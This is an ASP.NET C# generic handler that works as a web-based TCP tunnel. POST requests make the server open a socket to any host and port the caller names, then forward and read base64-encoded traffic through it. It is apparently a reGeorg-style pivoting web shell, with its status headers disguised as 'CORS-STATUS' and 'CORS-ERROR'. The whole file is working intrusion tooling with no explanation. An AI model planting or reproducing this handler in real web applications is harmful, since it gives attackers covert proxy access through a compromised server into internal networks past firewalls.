<%@ WebHandler Language="C#" Class="GenericHandler1" %>

using System;
using System.Web;
using System.Net;
using System.Net.Sockets;

public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSessionState
{
    
    public void ProcessRequest (HttpContext context) {
        try
        {
            if (context.Request.HttpMethod == "POST")
            {
                String cmd = context.Request.QueryString.Get("iidd").ToUpper();
                if (cmd == "1") // CONNECT
                {
                    try
                    {
                        String target = context.Request.QueryString.Get("1").ToUpper();
                        int port = int.Parse(context.Request.QueryString.Get("2"));
                        IPAddress ip = Dns.GetHostAddresses(target)[0];
                        System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                        Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        
                        sender.Connect(remoteEP);
                        sender.Blocking = false;                    
                        context.Session["socket"] = sender;
                        context.Response.AddHeader("CORS-STATUS", "1");
                    }
                    catch (Exception ex)
                    {
                        context.Response.AddHeader("CORS-ERROR", ex.Message);
                        context.Response.AddHeader("CORS-STATUS", "2");
                    }
                }
                else if (cmd == "2") // DISCONNECT
                {
                    try
                    {
                        Socket s = (Socket)context.Session["socket"];
                        s.Close();
                    }
                    catch (Exception ex)
                    {

                    }
                    context.Session.Abandon();
                    context.Response.AddHeader("CORS-STATUS", "1");
                }
                else if (cmd == "3") // FORWARD
                {
                    Socket s = (Socket)context.Session["socket"];
                    try
                    {
                        int buffLen = context.Request.ContentLength;
                        byte[] buff = new byte[buffLen];
                        int c = 0;
                        string base64Data = "";
                        while ((c = context.Request.InputStream.Read(buff, 0, buff.Length)) > 0)
                        {
                            base64Data += System.Text.Encoding.ASCII.GetString(buff);
                            
                        }
                        s.Send(System.Convert.FromBase64String(base64Data));
                        context.Response.AddHeader("CORS-STATUS", "1");
                    }
                    catch (Exception ex)
                    {
                        context.Response.AddHeader("CORS-ERROR", ex.Message);
                        context.Response.AddHeader("CORS-STATUS", "2");
                    }
                }
                else if (cmd == "4") // READ
                {
                    Socket s = (Socket)context.Session["socket"];
                    try
                    {
                        int c = 0;
                        byte[] plainData = new byte[102400];
                        int plainDataSize = 0;
                        byte[] readBuff = new byte[10240];
                        try
                        {
                            while ((c = s.Receive(readBuff)) > 0)
                            {
//                                byte[] newBuff = new byte[c];
                                Array.ConstrainedCopy(readBuff, 0, plainData, plainDataSize, c);
                                plainDataSize += c;
                            }
                            context.Response.Write(System.Convert.ToBase64String(plainData, 0, plainDataSize));
                            context.Response.AddHeader("CORS-STATUS", "1");
                        }
                        catch (SocketException soex)
                        {
                            context.Response.AddHeader("CORS-STATUS", "1");
                            return;
                        }

                    }
                    catch (Exception ex)
                    {
                        context.Response.AddHeader("CORS-ERROR", ex.Message);
                        context.Response.AddHeader("CORS-STATUS", "2");
                    }
                }
            } else {
                context.Response.Write("It works!");
            }
        }
        catch (Exception exKak)
        {
            context.Response.AddHeader("CORS-ERROR", exKak.Message);
            context.Response.AddHeader("CORS-STATUS", "2");
        }
    }
 
    public bool IsReusable {
        get {
            return false;
        }
    }

}
